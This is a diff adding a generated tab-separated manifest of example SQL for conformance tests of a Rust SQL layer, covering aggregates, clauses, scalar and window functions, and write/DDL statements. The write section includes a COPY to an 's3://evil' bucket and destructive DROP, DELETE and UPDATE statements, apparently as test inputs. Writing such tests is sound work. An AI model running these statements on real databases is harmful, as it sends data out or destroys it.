@@ -1,0 +1,123 @@
+# SQL conformance example manifest -- GENERATED, do not edit by hand.
+#
+# The exact SQL each conformance row executes, one record per line as
+# "<category>\t<construct>\t<example SQL>". Regenerated ONLY by
+#
+#     REGEN_SQL_CONFORMANCE_EXAMPLES=1 cargo test -p ravel-sql --test conformance
+#
+# and never by the prose document's REGEN_SQL_CONFORMANCE=1. This keeps
+# "the registry changed" and "an example's SQL changed" as two separate,
+# independently reviewed facts: regenerating docs/sql-conformance.md
+# cannot silently change what SQL a row runs (#408).
+#
+Aggregate	approx_distinct	SELECT approx_distinct(value) FROM samples
+Aggregate	approx_median	SELECT approx_median(value) FROM samples
+Aggregate	approx_percentile_cont	SELECT approx_percentile_cont(value) FROM samples
+Aggregate	approx_percentile_cont_with_weight	SELECT approx_percentile_cont_with_weight(value) FROM samples
+Aggregate	array_agg	SELECT array_agg(value) FROM samples
+Aggregate	avg	SELECT avg(value) FROM samples
+Aggregate	bit_and	SELECT bit_and(value) FROM samples
+Aggregate	bit_or	SELECT bit_or(value) FROM samples
+Aggregate	bit_xor	SELECT bit_xor(value) FROM samples
+Aggregate	bool_and	SELECT bool_and(value) FROM samples
+Aggregate	bool_or	SELECT bool_or(value) FROM samples
+Aggregate	corr	SELECT corr(value) FROM samples
+Aggregate	count	SELECT count(value) FROM samples
+Aggregate	covar	SELECT covar(value) FROM samples
+Aggregate	covar_pop	SELECT covar_pop(value) FROM samples
+Aggregate	covar_samp	SELECT covar_samp(value) FROM samples
+Aggregate	first_value	SELECT first_value(value) FROM samples
+Aggregate	grouping	SELECT grouping(value) FROM samples
+Aggregate	last_value	SELECT last_value(value) FROM samples
+Aggregate	max	SELECT max(value) FROM samples
+Aggregate	mean	SELECT mean(value) FROM samples
+Aggregate	median	SELECT median(value) FROM samples
+Aggregate	min	SELECT min(value) FROM samples
+Aggregate	nth_value	SELECT nth_value(value) FROM samples
+Aggregate	percentile_cont	SELECT percentile_cont(value) FROM samples
+Aggregate	quantile_cont	SELECT quantile_cont(value) FROM samples
+Aggregate	regr_avgx	SELECT regr_avgx(value) FROM samples
+Aggregate	regr_avgy	SELECT regr_avgy(value) FROM samples
+Aggregate	regr_count	SELECT regr_count(value) FROM samples
+Aggregate	regr_intercept	SELECT regr_intercept(value) FROM samples
+Aggregate	regr_r2	SELECT regr_r2(value) FROM samples
+Aggregate	regr_slope	SELECT regr_slope(value) FROM samples
+Aggregate	regr_sxx	SELECT regr_sxx(value) FROM samples
+Aggregate	regr_sxy	SELECT regr_sxy(value) FROM samples
+Aggregate	regr_syy	SELECT regr_syy(value) FROM samples
+Aggregate	stddev	SELECT stddev(value) FROM samples
+Aggregate	stddev_pop	SELECT stddev_pop(value) FROM samples
+Aggregate	stddev_samp	SELECT stddev_samp(value) FROM samples
+Aggregate	string_agg	SELECT string_agg(value) FROM samples
+Aggregate	sum	SELECT sum(value) FROM samples
+Aggregate	var	SELECT var(value) FROM samples
+Aggregate	var_pop	SELECT var_pop(value) FROM samples
+Aggregate	var_population	SELECT var_population(value) FROM samples
+Aggregate	var_samp	SELECT var_samp(value) FROM samples
+Aggregate	var_sample	SELECT var_sample(value) FROM samples
+Clause / operator	CASE	SELECT CASE WHEN value > 0 THEN 1 ELSE 0 END FROM samples
+Clause / operator	DATE_TRUNC	SELECT date_trunc('hour', ts) FROM samples
+Clause / operator	Filter (WHERE)	SELECT ts, value FROM samples WHERE value > 0 ORDER BY series_id, ts
+Clause / operator	GROUP BY	SELECT series_id, count(value) FROM samples GROUP BY series_id ORDER BY series_id
+Clause / operator	GROUP BY ordinal	SELECT series_id, count(value) FROM samples GROUP BY 1 ORDER BY series_id
+Clause / operator	HAVING	SELECT series_id, count(value) FROM samples GROUP BY series_id HAVING count(value) > 2
+Clause / operator	IN list	SELECT value FROM samples WHERE value IN (1, 2)
+Clause / operator	LIKE	SELECT count(*) FROM logs WHERE body LIKE '%record 1%'
+Clause / operator	LIMIT	SELECT ts, value FROM samples ORDER BY series_id, ts LIMIT 1
+Clause / operator	OFFSET	SELECT value FROM samples ORDER BY value OFFSET 1
+Clause / operator	ORDER BY	SELECT ts, value FROM samples ORDER BY ts
+Clause / operator	Projection	SELECT ts, value FROM samples ORDER BY series_id, ts
+Clause / operator	REGEXP_REPLACE backreference	SELECT regexp_replace('ab', '(a)(b)', '\2\1') FROM samples LIMIT 1
+Clause / operator	count(DISTINCT)	SELECT count(DISTINCT series_id) FROM samples
+Clause / operator	date_part(minute)	SELECT date_part('minute', ts) FROM samples
+Clause / operator	declared i64 typed aggregate	SELECT sum(dur) FROM logs
+Clause / operator	declared i64 typed comparison	SELECT ts FROM logs WHERE dur >= 20
+Scalar function	abs	SELECT abs(-3.5) FROM samples LIMIT 1
+Scalar function	current_date	SELECT current_date FROM samples
+Scalar function	current_time	SELECT current_time FROM samples
+Scalar function	current_timestamp	SELECT current_timestamp FROM samples
+Scalar function	encode	SELECT encode('a', 'hex') FROM samples LIMIT 1
+Scalar function	has_word	SELECT count(*) FROM logs WHERE has_word(body, '1')
+Scalar function	label	SELECT label(labels, '__name__') FROM samples WHERE value = 3.0
+Scalar function	label_match	SELECT count(*) FROM samples WHERE label_match(labels, '__name__', 'b')
+Scalar function	length	SELECT length('résumé') FROM samples LIMIT 1
+Scalar function	now	SELECT now() FROM samples
+Scalar function	rand	SELECT rand() FROM samples
+Scalar function	random	SELECT random() FROM samples
+Scalar function	regexp_replace	SELECT regexp_replace('foo123bar', '[0-9]+', 'X') FROM samples LIMIT 1
+Scalar function	reverse	SELECT reverse('résumé') FROM samples LIMIT 1
+Scalar function	to_char	SELECT to_char(make_date(2024, 7, 15), '%Y-%m-%d') FROM samples LIMIT 1
+Scalar function	today	SELECT today() FROM samples
+Scalar function	upper	SELECT upper('ab') FROM samples LIMIT 1
+Scalar function	uuid	SELECT uuid() FROM samples
+Scalar function	version	SELECT version() FROM samples
+Window function	cume_dist	SELECT max(c) FROM (SELECT cume_dist() OVER (ORDER BY value) AS c FROM samples)
+Window function	dense_rank	SELECT max(d) FROM (SELECT dense_rank() OVER (ORDER BY value) AS d FROM samples)
+Window function	first_value	SELECT first_value(value) OVER (ORDER BY ts) FROM samples
+Window function	lag	SELECT count(p) FROM (SELECT lag(value) OVER (ORDER BY value) AS p FROM samples)
+Window function	last_value	SELECT last_value(value) OVER (ORDER BY ts) FROM samples
+Window function	lead	SELECT count(nx) FROM (SELECT lead(value) OVER (ORDER BY value) AS nx FROM samples)
+Window function	nth_value	SELECT nth_value(value, 2) OVER (ORDER BY ts) FROM samples
+Window function	ntile	SELECT max(n) FROM (SELECT ntile(2) OVER (ORDER BY value) AS n FROM samples)
+Window function	percent_rank	SELECT max(pr) FROM (SELECT percent_rank() OVER (ORDER BY value) AS pr FROM samples)
+Window function	rank	SELECT max(r) FROM (SELECT rank() OVER (ORDER BY value) AS r FROM samples)
+Window function	row_number	SELECT max(rn) FROM (SELECT row_number() OVER (ORDER BY value) AS rn FROM samples)
+Window frame	avg (moving frame)	SELECT avg(value) OVER (ORDER BY ts ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) FROM samples
+Write / DDL statement	ALTER TABLE	ALTER TABLE samples ADD COLUMN x INT
+Write / DDL statement	COPY	COPY (SELECT 1) TO 's3://evil/out.parquet'
+Write / DDL statement	CREATE EXTERNAL TABLE	CREATE EXTERNAL TABLE t (a INT) STORED AS PARQUET LOCATION '/tmp/x'
+Write / DDL statement	CREATE SCHEMA	CREATE SCHEMA s
+Write / DDL statement	CREATE TABLE	CREATE TABLE t (a INT)
+Write / DDL statement	CREATE VIEW	CREATE VIEW v AS SELECT 1
+Write / DDL statement	DELETE	DELETE FROM samples
+Write / DDL statement	DROP	DROP TABLE samples
+Write / DDL statement	EXPLAIN	EXPLAIN SELECT 1
+Write / DDL statement	INSERT	INSERT INTO samples VALUES (1, 2.0)
+Write / DDL statement	PREPARE	PREPARE p AS SELECT 1
+Write / DDL statement	SET	SET datafusion.execution.batch_size = 1
+Write / DDL statement	Transaction control	BEGIN TRANSACTION
+Write / DDL statement	UPDATE	UPDATE samples SET value = 1
+Write / DDL statement	Write nested in a query body	WITH c AS (SELECT 1) INSERT INTO samples VALUES (1, 2.0)
+Table dispatch	both tables (cross-signal)	SELECT * FROM samples JOIN logs ON samples.ts = logs.ts
+Table dispatch	logs -> Signal::Logs	SELECT ts, body FROM logs
+Table dispatch	samples -> Signal::Metrics	SELECT ts, value FROM samples
